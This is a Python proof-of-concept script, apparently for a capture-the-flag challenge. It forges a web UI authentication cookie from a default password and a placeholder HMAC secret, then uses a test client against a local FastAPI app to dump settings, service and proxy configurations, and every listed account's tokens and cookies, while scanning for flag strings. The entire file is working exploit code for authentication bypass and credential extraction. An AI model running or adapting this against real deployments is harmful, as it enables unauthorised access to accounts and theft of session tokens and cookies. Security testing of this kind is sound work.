#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, List

DEFAULT_PASSWORD = "admin123"
DEFAULT_SECRET = "your-secret-key-change-in-production"
FLAG_PATTERNS = [
    re.compile(r"flag\{.*?\}", re.IGNORECASE),
    re.compile(r"CTF\{.*?\}", re.IGNORECASE),
    re.compile(r"DASCTF\{.*?\}", re.IGNORECASE),
]


def build_cookie(password: str = DEFAULT_PASSWORD, secret: str = DEFAULT_SECRET) -> str:
    return hmac.new(secret.encode("utf-8"), password.encode("utf-8"), hashlib.sha256).hexdigest()


def add_flag_hits(bucket: List[str], data: Any) -> None:
    text = data if isinstance(data, str) else json.dumps(data, ensure_ascii=False)
    for pattern in FLAG_PATTERNS:
        bucket.extend(pattern.findall(text))


def fetch_json(client, path: str) -> Any:
    resp = client.get(path)
    if resp.status_code != 200:
        raise RuntimeError(f"GET {path} -> HTTP {resp.status_code}: {resp.text[:300]}")
    return resp.json()


def main() -> int:
    parser = argparse.ArgumentParser(description="PoC: forge WebUI auth cookie and dump secrets from local FastAPI app")
    parser.add_argument("--project-root", default=str(Path(__file__).resolve().parents[1]))
    parser.add_argument("--dump-file", default="")
    args = parser.parse_args()

    project_root = Path(args.project_root).resolve()
    sys.path.insert(0, str(project_root))

    from fastapi.testclient import TestClient
    from src.database.init_db import initialize_database
    from src.web.app import create_app

    initialize_database()
    forged_cookie = build_cookie()
    hits: List[str] = []

    with TestClient(create_app()) as client:
        client.cookies.set("webui_auth", forged_cookie)
        result: Dict[str, Any] = {
            "project_root": str(project_root),
            "forged_cookie": forged_cookie,
            "settings": fetch_json(client, "/api/settings"),
            "email_services": [],
            "sub2api_services": [],
            "new_api_services": [],
            "tm_services": [],
            "proxies": [],
            "accounts": [],
        }
        add_flag_hits(hits, result["settings"])

        email_services = fetch_json(client, "/api/email-services")
        services = email_services.get("services", []) if isinstance(email_services, dict) else email_services
        for svc in services:
            full = fetch_json(client, f"/api/email-services/{svc['id']}/full")
            result["email_services"].append(full)
            add_flag_hits(hits, full)

        sub2_list = fetch_json(client, "/api/sub2api-services")
        for svc in sub2_list:
            full = fetch_json(client, f"/api/sub2api-services/{svc['id']}/full")
            result["sub2api_services"].append(full)
            add_flag_hits(hits, full)

        new_api_list = fetch_json(client, "/api/new-api-services")
        for svc in new_api_list:
            full = fetch_json(client, f"/api/new-api-services/{svc['id']}/full")
            result["new_api_services"].append(full)
            add_flag_hits(hits, full)

        tm_list = fetch_json(client, "/api/tm-services")
        for svc in tm_list:
            full = fetch_json(client, f"/api/tm-services/{svc['id']}")
            result["tm_services"].append(full)
            add_flag_hits(hits, full)

        proxy_list = fetch_json(client, "/api/settings/proxies")
        for proxy in proxy_list.get("proxies", []):
            full = fetch_json(client, f"/api/settings/proxies/{proxy['id']}")
            result["proxies"].append(full)
            add_flag_hits(hits, full)

        accounts = fetch_json(client, "/api/accounts?page=1&page_size=100")
        for account in accounts.get("accounts", []):
            item = {
                "summary": account,
                "tokens": fetch_json(client, f"/api/accounts/{account['id']}/tokens"),
                "cookies": fetch_json(client, f"/api/accounts/{account['id']}/cookies"),
            }
            result["accounts"].append(item)
            add_flag_hits(hits, item)

        result["flag_hits"] = sorted(set(hits))

    if args.dump_file:
        dump_path = Path(args.dump_file).resolve()
        dump_path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[+] dump saved: {dump_path}")

    print("[+] forged cookie:", forged_cookie)
    print("[+] email_services:", len(result["email_services"]))
    print("[+] sub2api_services:", len(result["sub2api_services"]))
    print("[+] new_api_services:", len(result["new_api_services"]))
    print("[+] tm_services:", len(result["tm_services"]))
    print("[+] proxies:", len(result["proxies"]))
    print("[+] accounts:", len(result["accounts"]))

    for item in result["email_services"]:
        print("[EMAIL]", json.dumps(item, ensure_ascii=False))
    for item in result["sub2api_services"]:
        print("[SUB2API]", json.dumps(item, ensure_ascii=False))
    for item in result["new_api_services"]:
        print("[NEW-API]", json.dumps(item, ensure_ascii=False))
    for item in result["accounts"]:
        print("[ACCOUNT]", json.dumps(item, ensure_ascii=False))

    if result["flag_hits"]:
        print("[FLAGS]", result["flag_hits"])
    else:
        print("[FLAGS] none")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
